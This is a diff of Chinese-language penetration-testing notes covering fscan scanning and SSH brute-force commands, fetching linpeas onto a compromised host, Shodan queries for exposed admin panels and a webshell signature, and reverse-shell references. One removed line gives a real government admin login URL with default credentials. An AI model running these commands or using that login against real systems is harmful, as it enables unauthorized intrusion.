@@ -326,14 +326,14 @@ p=subprocess.call(["/bin/bash","-i"])
 3.   不扫描某个 host：`fscan -h 192.168.0.1/24 -hn 192.168.0.1`
 4.   指定 ssh 端口进行 ssh 爆破，并尝试执行命令：`fscan -h 192.168.0.1/24 -m ssh -p 8022 -c whoami`
 5.   ssh 爆破，指定输入：`fscan -h 192.168.0.1/24 -pwdf passwords.txt -userf users.txt`
-6.   使用代理：`fscan -u http://cloudflare.com -proxy http://127.0.0.1:7890 `
+6.   使用代理：`fscan -u http://cloudflare.com -proxy http://127.0.0.1:7890`
 7.   指定各种模块：`fscan -h 192.168.0.1/24 -m [module]`
 
 ## scripts
 
 ### linpeas.sh
 
-一个专门用于检测主机所有可能利用的点的脚本，到 [这里](https://linpeas.sh/) 获取，想办法在靶机获取后直接运行即可
+一个专门用于检测主机所有可能利用的点的脚本，到 [linpeas.sh](https://linpeas.sh/) 获取，想办法在靶机获取后直接运行即可
 
 ### directionaries
 
@@ -347,10 +347,6 @@ p=subprocess.call(["/bin/bash","-i"])
 1.   [crackstation](https://crackstation.net/)
 
 ## base
-
-### 高级脚本
-
-访问该文件：`https://linpeas.sh/`，也可以直接获取：`wget https://linpeas.sh`
 
 ### 基础信息查询
 
@@ -369,8 +365,6 @@ p=subprocess.call(["/bin/bash","-i"])
 2.   `shodan search --fields ip_str,port port:23 "cisco -authorized"`
 3.   `shodan search --fields ip_str,port http.title:"棋牌" http.title:"后台"`
 4.   `shodan search --fields ip_str,port http.html:"Tas9er "`
-
-https://mahaeoffice.maharashtra.gov.in/admin/index.jsp，admin/admin
 
 ## sth
 
@@ -398,7 +392,7 @@ https://mahaeoffice.maharashtra.gov.in/admin/index.jsp，admin/admin
 4.   [get a shodan account here](https://maihao.de/)
 5.   [实践网络空间搜索引擎应用 & 信息收集](https://xz.aliyun.com/t/9508)
 6.   [网络空间搜索引擎的区别](https://xz.aliyun.com/t/9386)
-7.   [Shodan 漏洞扫描教程](https://www.bilibili.com/video/av760726529)
+7.   Shodan 漏洞扫描教程，bilibili/av760726529
 8.   反弹 shell 参考，[Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 9.   hashcat 密码类型参考，[Generic hash types](https://hashcat.net/wiki/doku.php?id=example_hashes)
 10.   [开源项目信息泄露笔记](https://blog.zgsec.cn/archives/205.html)
